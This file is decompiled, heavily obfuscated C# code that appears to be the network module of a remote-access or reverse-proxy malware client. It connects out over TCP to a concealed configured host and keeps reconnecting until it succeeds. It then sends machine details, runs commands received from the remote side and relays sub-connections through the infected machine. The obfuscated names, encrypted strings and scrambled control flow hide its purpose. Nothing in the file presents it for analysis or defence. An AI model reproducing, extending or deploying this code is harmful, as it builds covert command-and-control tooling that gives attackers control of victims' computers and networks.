using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class _________________________________________________________________________________
{
	private delegate void __________________________________________________________________________________(string string_0);

	private Thread __;

	private Thread m____;

	private TcpClient m_____;

	private bool m______;

	private __________________________________________________________________________________ m_______;

	public StreamWriter _______;

	public StreamReader ________;

	private string m__________;

	public string __________;

	private List<___________________________________________________________________________________> m____________;

	private event __________________________________________________________________________________ _
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			this.m_______ = (__________________________________________________________________________________)Delegate.Combine(this.m_______, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			this.m_______ = (__________________________________________________________________________________)Delegate.Remove(this.m_______, value);
		}
	}

	static _________________________________________________________________________________()
	{
		_________________________________________________________________________________._ = new Random();
	}

	public _________________________________________________________________________________()
	{
		__ = new Thread(______________);
		switch ((nint)Type.EmptyTypes.LongLength + 0)
		{
		}
		this.m____ = new Thread(_____________);
		this.m______ = false;
		this.m__________ = _003CModule_003E.___<string>(2512997663u);
		this.__________ = _003CModule_003E.____<string>(816071137u);
	}

	public unsafe void ___(byte[] byte_0)
	{
		string text = ________________(byte_0);
		string[] array = Strings.Split(text, this.__________, -1, (CompareMethod)0);
		string text2 = array[0];
		try
		{
			if (text2.Contains(_003CModule_003E.____<string>(4093950867u)))
			{
				Strings.Split(text2, _003CModule_003E.______<string>(1514956238u), -1, (CompareMethod)0);
			}
			if (Operators.CompareString(text2, _003CModule_003E._______<string>(3622075787u), false) == 0)
			{
				lock (this.m____________)
				{
					this.m____________.Add(new ___________________________________________________________________________________(Conversions.ToInteger(array[1]), array[2], Convert.ToInt32(array[3]), this));
				}
			}
			string value = default(string);
			nint num;
			if (text2.Contains(_003CModule_003E.____<string>(3353870568u)))
			{
				value = text2.Replace(_003CModule_003E.____<string>(3353870568u), string.Empty);
				num = sizeof(int) + -1;
				goto IL_0171;
			}
			goto IL_0190;
			IL_0132:
			byte[] byte_ = (byte[])NewLateBinding.LateIndexGet((object)_________________(byte_0, text2 + _003CModule_003E.____<string>(816071137u)), new object[1] { 1 }, (string[])null);
			num = (nint)Type.EmptyTypes.LongLength + 1;
			goto IL_0171;
			IL_01b4:
			if (text2.Contains(_003CModule_003E._______<string>(2452482004u)))
			{
				_________(_003CModule_003E._____<string>(3169546967u));
			}
			if (Operators.CompareString(text2, _003CModule_003E._____<string>(4110971236u), false) == 0)
			{
				___________();
			}
			return;
			IL_01a9:
			___________________________________________________________________________________ __________________________________________________________________________________ = default(___________________________________________________________________________________);
			__________________________________________________________________________________?.___________();
			goto IL_01b4;
			IL_0188:
			___________________________________________________________________________________ __________________________________________________________________________________2 = default(___________________________________________________________________________________);
			__________________________________________________________________________________2.____________(byte_);
			goto IL_0190;
			IL_0171:
			switch (num)
			{
			case 2:
				goto IL_0132;
			case 1:
				goto IL_0188;
			case 0:
				goto IL_01a9;
			}
			__________________________________________________________________________________2 = ______(Convert.ToInt32(value));
			if (__________________________________________________________________________________2 != null)
			{
				goto IL_0132;
			}
			goto IL_0190;
			IL_0190:
			if (Operators.CompareString(text2, _003CModule_003E._____<string>(3056958370u), false) == 0)
			{
				if (sizeof(short) + -13837 != -13835)
				{
					goto IL_0132;
				}
				__________________________________________________________________________________ = ______(Convert.ToInt32(array[1]));
				int num2 = default(int);
				num = (((-15 | -(7 * num2 + 25 * num2)) != -15) ? (sizeof(byte) + -1825004396) : ((nint)Type.EmptyTypes.LongLength + 0));
				goto IL_0171;
			}
			goto IL_01b4;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	internal void ____(int int_0)
	{
		try
		{
			_________(_003CModule_003E.___<string>(1531574613u) + this.__________ + int_0 + this.__________);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	internal void _____(int int_0, byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			string text = _003CModule_003E._______<string>(387157178u) + int_0 + this.__________;
			switch ((nint)Type.EmptyTypes.LongLength + 0)
			{
			}
			memoryStream.Write(_______________(text), 0, text.Length);
			memoryStream.Write(byte_0, 0, byte_0.Length);
			__________(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public ___________________________________________________________________________________ ______(int int_0)
	{
		lock (this.m____________)
		{
			int num = ______________________._______;
			nint num6;
			if (((2041053184 * num) & (347209728 * num)) != -5411)
			{
				int num2 = 182816 + (num << 9);
				int num3 = _003CModule_003E._________________;
				if (num2 == ((num3 << 7) + 3036) * 16)
				{
					int num4 = _003CModule_003E.___________;
					int num5;
					if (num4 - 4175 == -num4)
					{
						num5 = 2132847833;
						num6 = num5;
					}
					else if (~num3 != (int)((uint)(2 * num3 + 14 * num3) >> 4))
					{
						int num7 = default(int);
						if (3111 + (0x26A8 ^ num7) == num7 - 1346)
						{
							num5 = -1155387096;
							num6 = num5;
						}
						else
						{
							num5 = 2003606939;
							num6 = num5;
						}
					}
					else
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 1055786927;
					}
				}
				else
				{
					num6 = 24895;
				}
			}
			else
			{
				num6 = -1218952436;
			}
			int num9 = default(int);
			if (24896 != num6)
			{
				int num8 = this.m____________.Count - 1;
				num9 = 0;
				while (true)
				{
					if (num9 <= num8)
					{
						if (this.m____________[num9]._ == int_0)
						{
							break;
						}
						num9++;
						continue;
					}
					return null;
				}
			}
			return this.m____________[num9];
		}
	}

	public unsafe void _______(int int_0)
	{
		try
		{
			lock (this.m____________)
			{
				int num = this.m____________.Count - 1;
				int num2 = 0;
				switch (sizeof(Guid))
				{
				}
				while (true)
				{
					if (num2 <= num)
					{
						if (this.m____________[num2]._ == int_0)
						{
							break;
						}
						num2++;
						continue;
					}
					return;
				}
				this.m____________.RemoveAt(num2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	internal unsafe void ________(int int_0, bool bool_0, long long_0, int int_1, string string_0)
	{
		int int_2 = sizeof(int) + 23735;
		int num = _003CModule_003E._________________;
		string text = _003CModule_003E.__________(int_2, 21866, (int)(((num & 0x180000) != (int)(0x180000 & ((uint)(1223 * num + 825 * num) >> 11))) ? (sizeof(uint) + 449967039) : ((nint)Type.EmptyTypes.LongLength + 69)));
		try
		{
			IPHostEntry hostEntry = Dns.GetHostEntry(string_0);
			if (hostEntry != null && !string.IsNullOrEmpty(hostEntry.HostName))
			{
				text = hostEntry.HostName;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			int num2 = _003CModule_003E._______________;
			text = _003CModule_003E.__________((int)(((0x1E00u & ((uint)num2 % 334u)) != 0) ? ((nint)Type.EmptyTypes.LongLength + -1106452178) : 67078), (int)((nint)Type.EmptyTypes.LongLength + 66756), (int)(((((uint)num2 ^ ((uint)(num2 * 112 + num2 * 912) >> 10)) & 0x1DC240u) != 0) ? ((nint)Type.EmptyTypes.LongLength + 769464470) : 213));
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((12 * num + 52 * num) | -62) != -62)
			{
				goto IL_01f6;
			}
			MemoryStream memoryStream = new MemoryStream();
			string[] array = new string[12]
			{
				_003CModule_003E.______<string>(3848050600u),
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			};
			int num3 = default(int);
			nint num4 = (((0x787FFFFF | (((uint)num3 / 16147u + 3664) / 1755u)) != 2021654527) ? ((nint)Type.EmptyTypes.LongLength + -1836766512) : ((nint)Type.EmptyTypes.LongLength + 2));
			goto IL_0221;
			IL_01f6:
			array[5] = this.__________;
			array[6] = bool_0.ToString();
			num3 = (int)((nint)Type.EmptyTypes.LongLength + -551);
			num4 = (nint)Type.EmptyTypes.LongLength + 1;
			goto IL_0221;
			IL_0221:
			while (true)
			{
				switch (num4)
				{
				default:
					array[1] = this.__________;
					array[2] = Conversions.ToString(int_0);
					num3 = (int)((nint)Type.EmptyTypes.LongLength + -17210);
					num4 = sizeof(int) + -4;
					continue;
				case 1:
					array[7] = this.__________;
					array[8] = long_0.ToString();
					if (num3 != -9818)
					{
					}
					array[9] = this.__________;
					array[10] = int_1.ToString();
					num4 = (nint)Type.EmptyTypes.LongLength + 3;
					continue;
				case 0:
					array[3] = this.__________;
					array[4] = text;
					if (num3 == -17210)
					{
						break;
					}
					goto case 1;
				case 3:
				{
					array[11] = this.__________;
					string text2 = string.Concat(array);
					memoryStream.Write(_______________(text2), 0, text2.Length);
					__________(memoryStream.ToArray());
					memoryStream.Dispose();
					return;
				}
				}
				break;
			}
			goto IL_01f6;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void _________(string string_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			string text = string_0 + this.__________;
			memoryStream.Write(_______________(text), 0, text.Length);
			__________(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void __________(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(_______________(this.m__________), 0, this.m__________.Length);
			this.m_____.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void ___________()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string string_;
				string string_2;
				int num5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 281:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_003c;
						case 4:
							goto IL_0049;
						case 5:
							goto IL_0070;
						case 6:
							goto IL_007e;
						case 7:
							goto IL_00a2;
						case 8:
							goto IL_00b0;
						case 9:
							goto IL_00be;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00b0:
					num = 8;
					this._______.Close();
					goto IL_00be;
					IL_0007:
					num = 2;
					string_ = _003CModule_003E.___<string>(982404538u);
					string_2 = _003CModule_003E.____<string>(3976132824u);
					_003CModule_003E._______________ = num2;
					______________________________________________________________.______________(string_, string_2);
					if (sizeof(Guid) + 23911 != -12364)
					{
						goto IL_003c;
					}
					goto IL_00b0;
					IL_003c:
					num = 3;
					Thread.Sleep(250);
					goto IL_0049;
					IL_0049:
					num = 4;
					______________________________________________._ = false;
					num5 = _003CModule_003E.___________;
					if ((0x75666397 & ((int)((uint)num5 / 11744510u) - -741126588)) == 0)
					{
					}
					goto IL_0070;
					IL_0070:
					num = 5;
					__.Abort();
					goto IL_007e;
					IL_007e:
					num = 6;
					switch (sizeof(double))
					{
					case 7:
						goto IL_00b0;
					}
					this.m____.Abort();
					goto IL_00a2;
					IL_00be:
					num = 9;
					this.________.Close();
					break;
					IL_00a2:
					num = 7;
					this.m_____.Close();
					goto IL_00b0;
					end_IL_0000_2:
					break;
				}
				num = 10;
				Thread.CurrentThread.Abort();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 281;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void ____________()
	{
		try
		{
			string string_ = default(string);
			string[] array = default(string[]);
			int num5 = default(int);
			int num4 = default(int);
			while (!______________________________________________._)
			{
				______________________________________________________________.______________(_003CModule_003E._____<string>(1464211711u), _003CModule_003E._______<string>(2890662388u));
				int num = _003CModule_003E.___________;
				int num2 = (int)(((((uint)(-536870912 * num) >> 14) & 0x8000) == (uint)(0x8000 & (num << 15))) ? 22576 : ((nint)Type.EmptyTypes.LongLength + 957365921));
				nint num3 = sizeof(ushort) + 1;
				while (true)
				{
					switch (num3)
					{
					case 4:
						string_ = string.Concat(array);
						this.m_____ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
						if (10 * (num * 7 + num) + (num * 7 + num) * 6 == -6477)
						{
							num3 = (nint)Type.EmptyTypes.LongLength + 316223022;
							continue;
						}
						goto case 2;
					case 2:
						this.m_____.ReceiveBufferSize = 9999999;
						this.m_____.SendBufferSize = 9999999;
						num2 = (int)((num5 - 2669 != (int)((uint)(-356515840 * num5) >> 22)) ? (sizeof(short) + 9735) : ((nint)Type.EmptyTypes.LongLength + 2103540714));
						num3 = (nint)Type.EmptyTypes.LongLength + 0;
						continue;
					default:
						while (true)
						{
							array = new string[7]
							{
								_003CModule_003E.___<string>(1189505955u),
								null,
								null,
								null,
								null,
								null,
								null
							};
							num4 = num2;
							num2 = 32615;
							if (num4 != 22576)
							{
								break;
							}
							array[1] = ______________________________________________________________.________________________;
							array[2] = _003CModule_003E.____<string>(3008796200u);
							if (num2 == 31115)
							{
								goto end_IL_01ea;
							}
							array[3] = _________________________________________________________________._________();
							array[4] = _003CModule_003E.______<string>(861631917u);
							if ((uint)num2 / 61016u == 2074733548)
							{
								continue;
							}
							goto IL_019e;
						}
						goto case 0;
					case 0:
						Thread.Sleep(5000);
						if (!this.m_____.Client.Connected)
						{
							if (num2 != -15373)
							{
								this.m_____.Close();
								Thread.Sleep(5000);
								break;
							}
							goto case 4;
						}
						__________________(string_);
						this.m____________ = new List<___________________________________________________________________________________>();
						______________________________________________._ = true;
						__.Start();
						this.m____.Start();
						return;
					case 1:
						{
							array[5] = _________________________________________________________________.________();
							array[6] = _003CModule_003E._______<string>(1974200954u);
							if ((((uint)(1939 * num4 + num4 * 109) ^ ((uint)(0xC86 & num) >> 5)) & 0x300) == 0)
							{
								goto case 4;
							}
							num5 = _003CModule_003E.________________;
							goto default;
						}
						IL_019e:
						num3 = (nint)Type.EmptyTypes.LongLength + 1;
						continue;
						end_IL_01ea:
						break;
					}
					break;
				}
			}
			______________________________________________________________.______________(_003CModule_003E.______<string>(2043928306u), _003CModule_003E._______<string>(1611523509u));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E._____<string>(2571642080u), _003CModule_003E._______<string>(2159248989u) + ex2.ToString());
			___________();
			ProjectData.ClearProjectError();
		}
	}

	public void _____________()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					int num5 = _003CModule_003E._________________;
					if (((num5 * -1711276032) ^ 0x101F27) == 0)
					{
						goto IL_0049;
					}
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0057;
				}
				case 165:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 4:
							goto IL_0021;
						case 5:
							goto IL_0034;
						case 8:
						case 9:
							goto IL_0049;
						case 2:
						case 3:
						case 10:
							goto IL_0057;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0034:
					num = 5;
					if (!this.m_____.Client.Connected)
					{
						break;
					}
					goto IL_0049;
					IL_0049:
					num = 9;
					Thread.Sleep(5000);
					goto IL_0057;
					IL_0057:
					num = 3;
					goto IL_0021;
					IL_0021:
					num = 4;
					_________(_003CModule_003E.___<string>(3184663097u));
					goto IL_0034;
					end_IL_0000_2:
					break;
				}
				num = 6;
				___________();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 165;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void ______________()
	{
		MemoryStream memoryStream = new MemoryStream();
		byte[] array = default(byte[]);
		Array array2 = default(Array);
		int num4 = default(int);
		int num6 = default(int);
		while (true)
		{
			try
			{
				int num = _003CModule_003E._____________;
				if (1476395008 + ((num << 22) ^ 0x1B2C) == num * 4194304)
				{
					goto IL_0165;
				}
				goto IL_02aa;
				IL_02aa:
				if (!______________________________________________._)
				{
					___________();
				}
				nint num2;
				if (this.m_____.Available > 0)
				{
					num2 = (nint)Type.EmptyTypes.LongLength + 2;
					goto IL_0285;
				}
				goto IL_02b6;
				IL_01ba:
				memoryStream.Write(array, 0, array.Length);
				int num3 = _003CModule_003E.__________;
				num2 = ((((uint)(num3 * 14 + 50 * num3 - 3143) ^ 0x1D8Cu) != 0) ? (sizeof(byte) + 2) : ((nint)Type.EmptyTypes.LongLength + -2125108053));
				goto IL_0285;
				IL_0165:
				if (________________(memoryStream.ToArray()).Contains(_003CModule_003E._____<string>(1355333096u)))
				{
					array2 = _________________(memoryStream.ToArray(), _003CModule_003E.___<string>(2512997663u));
					num4 = 29033;
					int num5 = ______________________._______;
					if (~((num5 << 5) - 8579) == 2 * (num5 * 4 + 4 * num5))
					{
						goto IL_02aa;
					}
					___((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
					num4 = (int)((nint)Type.EmptyTypes.LongLength + 32485);
					if ((-(-5732 & num4) & 3) == 0)
					{
						goto IL_00d7;
					}
					num2 = (((((uint)num6 % 2u) & 0xFFFFE1FAu) == 0) ? ((nint)Type.EmptyTypes.LongLength + 1765411812) : ((nint)Type.EmptyTypes.LongLength + -1854557672));
					goto IL_0285;
				}
				goto IL_02b6;
				IL_00d7:
				memoryStream.Dispose();
				memoryStream = new MemoryStream();
				if (array2.Length == 2)
				{
					if (num4 != 32485)
					{
						goto IL_01ba;
					}
					memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, _003CModule_003E._______<string>(4255277695u), new object[0], (string[])null, (Type[])null, (bool[])null)));
					Thread.Sleep(1);
					goto IL_0165;
				}
				goto IL_02b6;
				IL_0285:
				while (true)
				{
					switch (num2)
					{
					case 0:
						break;
					case 3:
						goto IL_0165;
					default:
						array = new byte[this.m_____.Available - 1 + 1];
						num4 = (int)(((0x2189 & ((-1848300863 & num4) * 1024)) == 0) ? (sizeof(ushort) + -14840) : ((nint)Type.EmptyTypes.LongLength + 1367378952));
						num2 = (nint)Type.EmptyTypes.LongLength + 1;
						continue;
					case 1:
					{
						Socket client = this.m_____.Client;
						byte[] buffer = array;
						int size = array.Length;
						_003CModule_003E.______________ = -759738571;
						client.Receive(buffer, 0, size, SocketFlags.None);
						if (num4 != 3465)
						{
							goto IL_01ba;
						}
						goto default;
					}
					}
					break;
				}
				goto IL_00d7;
				IL_02b6:
				Thread.Sleep(10);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	public byte[] _______________(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public string ________________(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public unsafe Array _________________(byte[] byte_0, string string_0)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(________________(byte_0), string_0, -1, (CompareMethod)0);
		int num = ______________________._______;
		nint num2;
		if (((uint)num >> 25) + 18178048 != (uint)num % 168693468u >> 17)
		{
			num2 = (nint)Type.EmptyTypes.LongLength + 0;
		}
		else
		{
			int num3 = _003CModule_003E._________________;
			if ((-(0x39D | num3) & 0x219) != 1)
			{
				goto IL_0077;
			}
			num2 = sizeof(Guid) + 280464842;
		}
		goto IL_00db;
		IL_0077:
		memoryStream.Write(byte_0, 0, array[0].Length);
		int num4 = default(int);
		if ((-3747 ^ (1996488704 * num4)) == 0)
		{
			int num5 = _003CModule_003E._________________;
			num2 = ((((-2113888181 + (int)((uint)num5 / 1445u)) | 0x7FFFFFFF) != -1) ? ((nint)Type.EmptyTypes.LongLength + 877233698) : (sizeof(long) + -1901552341));
		}
		else
		{
			num2 = (nint)Type.EmptyTypes.LongLength + 1;
		}
		goto IL_00db;
		IL_00db:
		switch (num2)
		{
		case 1:
		{
			int offset = array[0].Length + string_0.Length;
			int count = byte_0.Length - (array[0].Length + string_0.Length);
			Array array2 = default(Array);
			_003CModule_003E._____ = array2;
			memoryStream2.Write(byte_0, offset, count);
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
		}
		goto IL_0077;
	}

	public void __________________(string string_0)
	{
		try
		{
			this._______ = new StreamWriter(this.m_____.GetStream());
			this._______.WriteLine(_003CModule_003E._______<string>(1020359086u) + string_0);
			this._______.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			___________();
			ProjectData.ClearProjectError();
		}
	}
}
